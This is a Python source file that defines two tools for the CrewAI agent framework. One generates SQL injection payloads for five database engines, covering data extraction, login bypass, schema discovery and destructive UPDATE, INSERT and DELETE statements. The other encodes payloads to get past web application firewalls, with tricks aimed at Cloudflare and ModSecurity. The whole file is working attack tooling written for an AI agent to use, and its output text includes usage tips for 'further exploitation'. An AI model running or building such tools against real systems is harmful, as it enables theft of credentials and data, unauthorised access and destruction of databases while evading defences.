from crewai.tools import BaseTool
from typing import Type, List, Dict, Any
from pydantic import BaseModel, Field
import base64
import urllib.parse
import random
import string
import re

class PayloadGeneratorToolInput(BaseModel):
    """Input schema for PayloadGeneratorTool."""
    db_type: str = Field(..., description="Database type (MySQL, PostgreSQL, SQLite, SQL Server, Oracle).")
    attack_type: str = Field(..., description="Type of attack (data_extraction, auth_bypass, db_modification).")
    context: Dict[str, Any] = Field(..., description="Context information about the vulnerable entry point.")

class PayloadGeneratorTool(BaseTool):
    name: str = "SQL Injection Payload Generator"
    description: str = (
        "Generates optimized SQL injection payloads based on the database type and attack goal."
    )
    args_schema: Type[BaseModel] = PayloadGeneratorToolInput

    def _run(self, db_type: str, attack_type: str, context: Dict[str, Any]) -> str:
        try:
            db_type = db_type.lower()
            attack_type = attack_type.lower()
            
            # Basic database-specific payload templates
            db_payloads = {
                "mysql": {
                    "data_extraction": [
                        "' UNION SELECT {columns} FROM {table} -- ",
                        "' UNION SELECT {columns} FROM {table} WHERE 1=1 -- ",
                        "' AND 1=0 UNION SELECT {columns} FROM {table} -- ",
                    ],
                    "auth_bypass": [
                        "' OR 1=1 -- ",
                        "' OR '1'='1' -- ",
                        "admin' -- ",
                        "admin' OR '1'='1' -- ",
                    ],
                    "db_modification": [
                        "'; UPDATE {table} SET {column}='{value}' WHERE {condition} -- ",
                        "'; INSERT INTO {table} ({columns}) VALUES ({values}) -- ",
                        "'; DELETE FROM {table} WHERE {condition} -- ",
                    ],
                    "schema_discovery": [
                        "' UNION SELECT table_name, column_name FROM information_schema.columns -- ",
                        "' UNION SELECT table_schema, table_name FROM information_schema.tables -- ",
                        "' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = '{table}' -- ",
                    ]
                },
                "postgresql": {
                    "data_extraction": [
                        "' UNION SELECT {columns} FROM {table} -- ",
                        "' UNION SELECT {columns} FROM {table} WHERE 1=1 -- ",
                        "' AND 1=0 UNION SELECT {columns} FROM {table} -- ",
                    ],
                    "auth_bypass": [
                        "' OR 1=1 -- ",
                        "' OR '1'='1' -- ",
                        "admin' -- ",
                        "admin' OR '1'='1' -- ",
                    ],
                    "db_modification": [
                        "'; UPDATE {table} SET {column}='{value}' WHERE {condition} -- ",
                        "'; INSERT INTO {table} ({columns}) VALUES ({values}) -- ",
                        "'; DELETE FROM {table} WHERE {condition} -- ",
                    ],
                    "schema_discovery": [
                        "' UNION SELECT table_name, column_name FROM information_schema.columns -- ",
                        "' UNION SELECT table_schema, table_name FROM information_schema.tables -- ",
                        "' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = '{table}' -- ",
                    ]
                },
                "sqlite": {
                    "data_extraction": [
                        "' UNION SELECT {columns} FROM {table} -- ",
                        "' UNION SELECT {columns} FROM {table} WHERE 1=1 -- ",
                        "' AND 1=0 UNION SELECT {columns} FROM {table} -- ",
                    ],
                    "auth_bypass": [
                        "' OR 1=1 -- ",
                        "' OR '1'='1' -- ",
                        "admin' -- ",
                        "admin' OR '1'='1' -- ",
                    ],
                    "db_modification": [
                        "'; UPDATE {table} SET {column}='{value}' WHERE {condition} -- ",
                        "'; INSERT INTO {table} ({columns}) VALUES ({values}) -- ",
                        "'; DELETE FROM {table} WHERE {condition} -- ",
                    ],
                    "schema_discovery": [
                        "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' -- ",
                        "' UNION SELECT name, type FROM sqlite_master -- ",
                    ]
                },
                "sql server": {
                    "data_extraction": [
                        "' UNION SELECT {columns} FROM {table} -- ",
                        "' UNION ALL SELECT {columns} FROM {table} -- ",
                        "' AND 1=0 UNION ALL SELECT {columns} FROM {table} -- ",
                    ],
                    "auth_bypass": [
                        "' OR 1=1 -- ",
                        "' OR '1'='1' -- ",
                        "admin'-- ",
                        "admin' OR '1'='1'-- ",
                    ],
                    "db_modification": [
                        "'; UPDATE {table} SET {column}='{value}' WHERE {condition} -- ",
                        "'; INSERT INTO {table} ({columns}) VALUES ({values}) -- ",
                        "'; DELETE FROM {table} WHERE {condition} -- ",
                    ],
                    "schema_discovery": [
                        "' UNION SELECT name, type FROM sys.objects WHERE type_desc = 'USER_TABLE' -- ",
                        "' UNION SELECT table_name, column_name FROM information_schema.columns -- ",
                    ]
                },
                "oracle": {
                    "data_extraction": [
                        "' UNION SELECT {columns} FROM {table} -- ",
                        "' UNION SELECT {columns} FROM {table} WHERE 1=1 -- ",
                        "' AND 1=0 UNION SELECT {columns} FROM {table} -- ",
                    ],
                    "auth_bypass": [
                        "' OR 1=1 -- ",
                        "' OR '1'='1' -- ",
                        "admin' -- ",
                        "admin' OR '1'='1' -- ",
                    ],
                    "db_modification": [
                        "'; UPDATE {table} SET {column}='{value}' WHERE {condition} -- ",
                        "'; INSERT INTO {table} ({columns}) VALUES ({values}) -- ",
                        "'; DELETE FROM {table} WHERE {condition} -- ",
                    ],
                    "schema_discovery": [
                        "' UNION SELECT table_name, column_name FROM all_tab_columns -- ",
                        "' UNION SELECT owner, table_name FROM all_tables -- ",
                    ]
                }
            }
            
            # Default to MySQL if db_type not found
            if db_type not in db_payloads:
                db_type = "mysql"
                
            # Default to data_extraction if attack_type not found
            if attack_type not in db_payloads[db_type]:
                attack_type = "data_extraction"
            
            # Generate payloads based on the templates
            raw_payloads = db_payloads[db_type][attack_type]
            finalized_payloads = []
            
            for template in raw_payloads:
                # Format the template based on context
                if attack_type == "data_extraction":
                    # Generate column list based on context or default to common columns
                    columns = context.get("columns", "username, password")
                    table = context.get("table", "users")
                    payload = template.format(columns=columns, table=table)
                elif attack_type == "auth_bypass":
                    # Authentication bypass payloads don't need much customization
                    payload = template
                elif attack_type == "db_modification":
                    table = context.get("table", "users")
                    column = context.get("column", "password")
                    value = context.get("value", "hacked")
                    condition = context.get("condition", "id=1")
                    columns = context.get("columns", "username, password")
                    values = context.get("values", "'admin', 'hacked'")
                    payload = template.format(
                        table=table, 
                        column=column, 
                        value=value, 
                        condition=condition, 
                        columns=columns, 
                        values=values
                    )
                elif attack_type == "schema_discovery":
                    table = context.get("table", "users")
                    payload = template.format(table=table)
                
                finalized_payloads.append(payload)
            
            # Format the results
            result_str = f"SQL Injection Payloads for {db_type.upper()} - {attack_type.upper()}\n\n"
            
            for i, payload in enumerate(finalized_payloads, 1):
                result_str += f"Payload #{i}: `{payload}`\n\n"
            
            result_str += "Usage Instructions:\n"
            result_str += f"1. These payloads are designed for {db_type.upper()} databases.\n"
            result_str += f"2. The attack type is '{attack_type}'.\n"
            
            if attack_type == "data_extraction":
                result_str += "3. These payloads attempt to extract data from the database.\n"
                result_str += "4. You may need to adjust the number of columns in the UNION SELECT statement.\n"
            elif attack_type == "auth_bypass":
                result_str += "3. These payloads attempt to bypass authentication mechanisms.\n"
                result_str += "4. They work best when injected into login form fields.\n"
            elif attack_type == "db_modification":
                result_str += "3. These payloads attempt to modify the database content.\n"
                result_str += "4. Use with caution as they can cause permanent changes to the database.\n"
            elif attack_type == "schema_discovery":
                result_str += "3. These payloads attempt to discover the database schema.\n"
                result_str += "4. They help identify tables and columns for further exploitation.\n"
            
            return result_str
            
        except Exception as e:
            return f"Error generating SQL injection payloads: {str(e)}"


class WAFEvasionToolInput(BaseModel):
    """Input schema for WAFEvasionTool."""
    payload: str = Field(..., description="The SQL injection payload to encode for WAF evasion.")
    waf_type: str = Field(default="generic", description="Type of WAF to evade (generic, cloudflare, modsecurity, etc.).")

class WAFEvasionTool(BaseTool):
    name: str = "WAF Evasion Tool"
    description: str = (
        "Encodes SQL injection payloads to evade Web Application Firewalls (WAFs)."
    )
    args_schema: Type[BaseModel] = WAFEvasionToolInput

    def _run(self, payload: str, waf_type: str = "generic") -> str:
        try:
            waf_type = waf_type.lower()
            
            # Apply different evasion techniques based on WAF type
            if waf_type == "cloudflare":
                # Cloudflare-specific evasion techniques
                encoded_payloads = self._cloudflare_evasion(payload)
            elif waf_type == "modsecurity":
                # ModSecurity-specific evasion techniques
                encoded_payloads = self._modsecurity_evasion(payload)
            else:
                # Generic WAF evasion techniques
                encoded_payloads = self._generic_evasion(payload)
            
            # Format the results
            result_str = "WAF Evasion Encodings\n\n"
            result_str += f"Original Payload: `{payload}`\n\n"
            
            for i, (name, encoded) in enumerate(encoded_payloads.items(), 1):
                result_str += f"Encoding #{i} - {name}: `{encoded}`\n\n"
            
            result_str += "Evasion Techniques Overview:\n"
            
            if waf_type == "cloudflare":
                result_str += "1. Cloudflare WAF focuses on pattern matching and request rate limiting.\n"
                result_str += "2. The encodings provided help bypass pattern matching by obscuring SQL keywords.\n"
                result_str += "3. Try the Unicode/Hex encoding first as it's generally most effective against Cloudflare.\n"
            elif waf_type == "modsecurity":
                result_str += "1. ModSecurity is an open-source WAF with complex rule sets.\n"
                result_str += "2. The encodings focus on bypassing OWASP CRS rules implemented in ModSecurity.\n"
                result_str += "3. Try the Comment Injection method first as it's often effective against ModSecurity.\n"
            else:
                result_str += "1. These generic encodings work against many common WAF implementations.\n"
                result_str += "2. If one encoding doesn't work, try the next one in sequence.\n"
                result_str += "3. Combining multiple encoding techniques can increase the chance of bypassing the WAF.\n"
            
            return result_str
            
        except Exception as e:
            return f"Error encoding payload for WAF evasion: {str(e)}"
    
    def _generic_evasion(self, payload):
        encodings = {}
        
        # URL Encoding
        url_encoded = urllib.parse.quote(payload)
        encodings["URL Encoding"] = url_encoded
        
        # Double URL Encoding
        double_url_encoded = urllib.parse.quote(urllib.parse.quote(payload))
        encodings["Double URL Encoding"] = double_url_encoded
        
        # Unicode Encoding
        unicode_encoded = ""
        for char in payload:
            unicode_encoded += f"\\u00{ord(char):02x}"
        encodings["Unicode Encoding"] = unicode_encoded
        
        # Hex Encoding
        hex_encoded = ""
        for char in payload:
            hex_encoded += f"\\x{ord(char):02x}"
        encodings["Hex Encoding"] = hex_encoded
        
        # HTML Entity Encoding
        html_encoded = ""
        for char in payload:
            html_encoded += f"&#{ord(char)};"
        encodings["HTML Entity Encoding"] = html_encoded
        
        # SQL Comment Injection
        comment_injected = re.sub(r'(SELECT|UNION|AND|OR|FROM|WHERE)', r'/**/\1', payload, flags=re.IGNORECASE)
        encodings["SQL Comment Injection"] = comment_injected
        
        # Case Randomization
        case_randomized = ""
        for char in payload:
            if char.isalpha():
                if random.choice([True, False]):
                    case_randomized += char.upper()
                else:
                    case_randomized += char.lower()
            else:
                case_randomized += char
        encodings["Case Randomization"] = case_randomized
        
        return encodings
    
    def _cloudflare_evasion(self, payload):
        encodings = self._generic_evasion(payload)
        
        # Additional Cloudflare-specific evasion techniques
        
        # Unicode/Hex Hybrid
        hybrid = ""
        for i, char in enumerate(payload):
            if i % 2 == 0:
                hybrid += f"\\u00{ord(char):02x}"
            else:
                hybrid += f"\\x{ord(char):02x}"
        encodings["Unicode/Hex Hybrid"] = hybrid
        
        # Base64 Encoding
        base64_encoded = base64.b64encode(payload.encode()).decode()
        encodings["Base64 Encoding"] = base64_encoded
        
        # Space Substitution
        space_subst = payload.replace(" ", "/**/")
        encodings["Space Substitution"] = space_subst
        
        return encodings
    
    def _modsecurity_evasion(self, payload):
        encodings = self._generic_evasion(payload)
        
        # Additional ModSecurity-specific evasion techniques
        
        # Nullbyte Injection
        nullbyte = ""
        for char in payload:
            nullbyte += char + "\x00"
        nullbyte_encoded = ""
        for char in nullbyte:
            if char == "\x00":
                nullbyte_encoded += "\\x00"
            else:
                nullbyte_encoded += char
        encodings["Nullbyte Injection"] = nullbyte_encoded
        
        # Alternating Case with Comment
        alt_case_comment = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                if i % 2 == 0:
                    alt_case_comment += char.upper() + "/**/"
                else:
                    alt_case_comment += char.lower()
            else:
                alt_case_comment += char
        encodings["Alternating Case with Comment"] = alt_case_comment
        
        # Multi-Line Comment Break
        multi_line = re.sub(r'(SELECT|UNION|AND|OR|FROM|WHERE)', r'/*\n*/\1', payload, flags=re.IGNORECASE)
        encodings["Multi-Line Comment Break"] = multi_line
        
        return encodings 